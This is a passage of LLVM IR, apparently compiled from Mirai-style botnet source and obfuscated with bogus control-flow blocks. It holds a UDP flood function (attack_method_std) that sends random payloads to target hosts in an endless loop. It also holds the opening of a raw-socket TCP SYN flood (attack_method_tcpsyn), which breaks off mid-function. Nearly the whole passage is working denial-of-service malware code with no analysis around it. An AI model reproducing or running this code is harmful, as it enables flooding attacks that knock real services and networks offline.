  %738 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %739 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %740 = load i32, i32* %9, align 4
  %741 = sext i32 %740 to i64
  %742 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %739, i64 %741
  %743 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %742, i32 0, i32 0
  %744 = bitcast %struct.sockaddr_in* %743 to %struct.sockaddr*
  store %struct.sockaddr* %744, %struct.sockaddr** %738, align 8
  %745 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %746 = load %struct.sockaddr*, %struct.sockaddr** %745, align 8
  %747 = call i64 @sendto(i32 %733, i8* %734, i64 %737, i32 16384, %struct.sockaddr* %746, i32 16)
  br label %originalBB60
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 1024)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %234, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %237

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %97

; <label>:72:                                     ; preds = %63
  %73 = load i32, i32* @x.23
  %74 = load i32, i32* @y.24
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %72
  %81 = call i32 @rand_next()
  %82 = trunc i32 %81 to i16
  %83 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %84 = load i32, i32* %9, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %83, i64 %85
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %86, i32 0, i32 0
  %88 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %87, i32 0, i32 1
  store i16 %82, i16* %88, align 2
  %89 = load i32, i32* @x.23
  %90 = load i32, i32* @y.24
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %122

; <label>:97:                                     ; preds = %63
  %98 = load i32, i32* @x.23
  %99 = load i32, i32* @y.24
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %97
  %106 = load i16, i16* %12, align 2
  %107 = call zeroext i16 @htons(i16 zeroext %106) #7
  %108 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %109 = load i32, i32* %9, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %108, i64 %110
  %112 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %111, i32 0, i32 0
  %113 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %112, i32 0, i32 1
  store i16 %107, i16* %113, align 2
  %114 = load i32, i32* @x.23
  %115 = load i32, i32* @y.24
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %122

; <label>:122:                                    ; preds = %originalBBpart24, %originalBBpart2
  %123 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %124 = load i32*, i32** %11, align 8
  %125 = load i32, i32* %9, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds i32, i32* %124, i64 %126
  store i32 %123, i32* %127, align 4
  %128 = icmp eq i32 %123, -1
  br i1 %128, label %129, label %130

; <label>:129:                                    ; preds = %122
  ret void

; <label>:130:                                    ; preds = %122
  %131 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %131, align 4
  %132 = load i16, i16* %13, align 2
  %133 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %132, i16* %133, align 2
  %134 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %135 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %134, i32 0, i32 0
  store i32 0, i32* %135, align 4
  %136 = load i32*, i32** %11, align 8
  %137 = load i32, i32* %9, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds i32, i32* %136, i64 %138
  %140 = load i32, i32* %139, align 4
  %141 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %142 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %142, %struct.sockaddr** %141, align 8
  %143 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %144 = load %struct.sockaddr*, %struct.sockaddr** %143, align 8
  %145 = call i32 @bind(i32 %140, %struct.sockaddr* %144, i32 16) #6
  %146 = icmp eq i32 %145, -1
  br i1 %146, label %147, label %148

; <label>:147:                                    ; preds = %130
  br label %148

; <label>:148:                                    ; preds = %147, %130
  %149 = load i32, i32* @x.23
  %150 = load i32, i32* @y.24
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %148
  %157 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %158 = load i32, i32* %9, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i64 %159
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i32 0, i32 2
  %162 = load i8, i8* %161, align 4
  %163 = zext i8 %162 to i32
  %164 = icmp slt i32 %163, 32
  %165 = load i32, i32* @x.23
  %166 = load i32, i32* @y.24
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %164, label %173, label %215

; <label>:173:                                    ; preds = %originalBBpart28
  %174 = load i32, i32* @x.23
  %175 = load i32, i32* @y.24
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %173
  %182 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %183 = load i32, i32* %9, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %182, i64 %184
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %185, i32 0, i32 1
  %187 = load i32, i32* %186, align 4
  %188 = call i32 @ntohl(i32 %187) #7
  %189 = call i32 @rand_next()
  %190 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %191 = load i32, i32* %9, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i64 %192
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i32 0, i32 2
  %195 = load i8, i8* %194, align 4
  %196 = zext i8 %195 to i32
  %197 = lshr i32 %189, %196
  %198 = add i32 %188, %197
  %199 = call i32 @htonl(i32 %198) #7
  %200 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %201 = load i32, i32* %9, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i64 %202
  %204 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %203, i32 0, i32 0
  %205 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %204, i32 0, i32 2
  %206 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %205, i32 0, i32 0
  store i32 %199, i32* %206, align 4
  %207 = load i32, i32* @x.23
  %208 = load i32, i32* @y.24
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBBpart220, label %originalBB10alteredBB

originalBBpart220:                                ; preds = %originalBB10
  br label %215

; <label>:215:                                    ; preds = %originalBBpart220, %originalBBpart28
  %216 = load i32*, i32** %11, align 8
  %217 = load i32, i32* %9, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds i32, i32* %216, i64 %218
  %220 = load i32, i32* %219, align 4
  %221 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %222 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %223 = load i32, i32* %9, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %222, i64 %224
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %225, i32 0, i32 0
  %227 = bitcast %struct.sockaddr_in* %226 to %struct.sockaddr*
  store %struct.sockaddr* %227, %struct.sockaddr** %221, align 8
  %228 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %229 = load %struct.sockaddr*, %struct.sockaddr** %228, align 8
  %230 = call i32 @connect(i32 %220, %struct.sockaddr* %229, i32 16)
  %231 = icmp eq i32 %230, -1
  br i1 %231, label %232, label %233

; <label>:232:                                    ; preds = %215
  br label %233

; <label>:233:                                    ; preds = %232, %215
  br label %234

; <label>:234:                                    ; preds = %233
  %235 = load i32, i32* %9, align 4
  %236 = add nsw i32 %235, 1
  store i32 %236, i32* %9, align 4
  br label %58

; <label>:237:                                    ; preds = %58
  %238 = load i32, i32* @x.23
  %239 = load i32, i32* @y.24
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %237
  %246 = load i32, i32* @x.23
  %247 = load i32, i32* @y.24
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %254

; <label>:254:                                    ; preds = %317, %originalBBpart224
  %255 = load i32, i32* @x.23
  %256 = load i32, i32* @y.24
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %254
  store i32 0, i32* %9, align 4
  %263 = load i32, i32* @x.23
  %264 = load i32, i32* @y.24
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %271

; <label>:271:                                    ; preds = %314, %originalBBpart228
  %272 = load i32, i32* @x.23
  %273 = load i32, i32* @y.24
  %274 = sub i32 %272, 1
  %275 = mul i32 %272, %274
  %276 = urem i32 %275, 2
  %277 = icmp eq i32 %276, 0
  %278 = icmp slt i32 %273, 10
  %279 = or i1 %277, %278
  br i1 %279, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %271
  %280 = load i32, i32* %9, align 4
  %281 = load i8, i8* %5, align 1
  %282 = zext i8 %281 to i32
  %283 = icmp slt i32 %280, %282
  %284 = load i32, i32* @x.23
  %285 = load i32, i32* @y.24
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %283, label %292, label %317

; <label>:292:                                    ; preds = %originalBBpart232
  %293 = load i8**, i8*** %10, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds i8*, i8** %293, i64 %295
  %297 = load i8*, i8** %296, align 8
  store i8* %297, i8** %22, align 8
  %298 = load i8, i8* %15, align 1
  %299 = icmp ne i8 %298, 0
  br i1 %299, label %300, label %304

; <label>:300:                                    ; preds = %292
  %301 = load i8*, i8** %22, align 8
  %302 = load i16, i16* %14, align 2
  %303 = zext i16 %302 to i32
  call void @rand_str(i8* %301, i32 %303)
  br label %304

; <label>:304:                                    ; preds = %300, %292
  %305 = load i32*, i32** %11, align 8
  %306 = load i32, i32* %9, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds i32, i32* %305, i64 %307
  %309 = load i32, i32* %308, align 4
  %310 = load i8*, i8** %22, align 8
  %311 = load i16, i16* %14, align 2
  %312 = zext i16 %311 to i64
  %313 = call i64 @send(i32 %309, i8* %310, i64 %312, i32 16384)
  br label %314

; <label>:314:                                    ; preds = %304
  %315 = load i32, i32* %9, align 4
  %316 = add nsw i32 %315, 1
  store i32 %316, i32* %9, align 4
  br label %271

; <label>:317:                                    ; preds = %originalBBpart232
  br label %254

originalBBalteredBB:                              ; preds = %originalBB, %72
  %318 = call i32 @rand_next()
  %319 = trunc i32 %318 to i16
  %320 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %321 = load i32, i32* %9, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %323, i32 0, i32 0
  %325 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %324, i32 0, i32 1
  store i16 %319, i16* %325, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %97
  %326 = load i16, i16* %12, align 2
  %327 = call zeroext i16 @htons(i16 zeroext %326) #7
  %328 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %329 = load i32, i32* %9, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %328, i64 %330
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %331, i32 0, i32 0
  %333 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %332, i32 0, i32 1
  store i16 %327, i16* %333, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %148
  %334 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %335 = load i32, i32* %9, align 4
  %336 = sext i32 %335 to i64
  %337 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %334, i64 %336
  %338 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %337, i32 0, i32 2
  %339 = load i8, i8* %338, align 4
  %340 = zext i8 %339 to i32
  %341 = icmp slt i32 %340, 32
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %173
  %342 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %343 = load i32, i32* %9, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %342, i64 %344
  %346 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %345, i32 0, i32 1
  %347 = load i32, i32* %346, align 4
  %348 = call i32 @ntohl(i32 %347) #7
  %349 = call i32 @rand_next()
  %350 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %351 = load i32, i32* %9, align 4
  %352 = sext i32 %351 to i64
  %353 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %350, i64 %352
  %354 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %353, i32 0, i32 2
  %355 = load i8, i8* %354, align 4
  %356 = zext i8 %355 to i32
  %_ = sub i32 0, %349
  %gen = add i32 %_, %356
  %_11 = shl i32 %349, %356
  %_12 = sub i32 0, %349
  %gen13 = add i32 %_12, %356
  %357 = lshr i32 %349, %356
  %_14 = sub i32 0, %348
  %gen15 = add i32 %_14, %357
  %_16 = sub i32 %348, %357
  %gen17 = mul i32 %_16, %357
  %_18 = shl i32 %348, %357
  %358 = add i32 %348, %357
  %359 = call i32 @htonl(i32 %358) #7
  %360 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %361 = load i32, i32* %9, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %360, i64 %362
  %364 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %363, i32 0, i32 0
  %365 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %364, i32 0, i32 2
  %366 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %365, i32 0, i32 0
  store i32 %359, i32* %366, align 4
  br label %originalBB10

originalBB22alteredBB:                            ; preds = %originalBB22, %237
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %254
  store i32 0, i32* %9, align 4
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %271
  %367 = load i32, i32* %9, align 4
  %368 = load i8, i8* %5, align 1
  %369 = zext i8 %368 to i32
  %370 = icmp slt i32 %367, %369
  br label %originalBB30
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %115

; <label>:98:                                     ; preds = %4
  %99 = load i32, i32* @x.25
  %100 = load i32, i32* @y.26
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %98
  %107 = load i32, i32* @x.25
  %108 = load i32, i32* @y.26
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %613

; <label>:115:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %116 = load i32, i32* %10, align 4
  %117 = bitcast i32* %9 to i8*
  %118 = call i32 @setsockopt(i32 %116, i32 0, i32 3, i8* %117, i32 4) #6
  %119 = icmp eq i32 %118, -1
  br i1 %119, label %120, label %123

; <label>:120:                                    ; preds = %115
  %121 = load i32, i32* %10, align 4
  %122 = call i32 @close(i32 %121)
  br label %613

; <label>:123:                                    ; preds = %115
  store i32 0, i32* %9, align 4
  br label %124

; <label>:124:                                    ; preds = %originalBBpart244, %123
